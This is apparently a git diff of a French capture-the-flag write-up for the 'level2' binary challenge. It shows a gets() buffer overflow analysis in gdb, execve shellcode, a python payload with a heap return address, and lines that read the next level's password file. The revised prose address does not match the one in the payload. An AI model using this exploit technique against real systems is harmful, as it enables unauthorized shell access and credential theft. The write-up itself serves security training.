@@ -11,7 +11,7 @@
 
 ## Analyse
 En analysant le binaire (`gdb ./level2`) on observe:
-- La présence d'une fonction `p()` avec un appel a `gets()`. Comme dans l'exercice precedent, la faille se trouve ici. 
+- La présence d'une fonction `p()` avec un appel a `gets()`. Comme dans l'exercice précédent, la faille se trouve ici. 
   ```shell
   (gdb) disas p
   ...
@@ -44,7 +44,7 @@ Trouve [ici] (http://shell-storm.org/shellcode/files/shellcode-575.php). Il est 
   \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
   ```
 - On overwrite l'adresse de retour en utilisant un pattern generator comme [celui-ci] (https://wiremask.eu/tools/buffer-overflow-pattern-generator/) afin de trouver l'offset de l'`eip`. On voit qu'il est de 80 bytes.
-- On ajoute 59 bytes de padding (80 - 21) suivi de l'adresse du buffer dans la heap (`\x08\xa0\x04\x08`). Pour trouver celle ci on `run` le programme sous gdb en mettant un breakpoint apres `strdup()`, on observe l'etat du registre `eax` puisque `strdup()` y stocke l'adresse du buffer : 
+- On ajoute 59 bytes de padding (80 - 21) suivi de l'adresse du buffer dans la heap (`\x08\xb0\x04\x08`). Pour trouver celle ci on `run` le programme sous gdb en mettant un breakpoint après `strdup()`, on observe l’état du registre `eax` puisque `strdup()` y stocke l'adresse du buffer) : 
   ```shell
   python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/payload
   ```
@@ -52,8 +52,8 @@ Trouve [ici] (http://shell-storm.org/shellcode/files/shellcode-575.php). Il est 
   ```shell
   cat /tmp/payload - | ./level2
   ```
-- Un shell s'ouvre avec de nouveaux privilèges : en effet, si l'on tape `whoami`, on obtient `level3`.
-- Il ne reste plus qu'à :
-  - récupérer le password (`cat /home/user/level3/.pass`)
-  - quitter le shell (`exit`)
-  - et passer au level3 (`su level3`) en renseignant ce password.
+
+Il ne reste plus qu'à :
+- et passer au level3 (`su level3`) en renseignant le password obtenu plus haut.
+
+
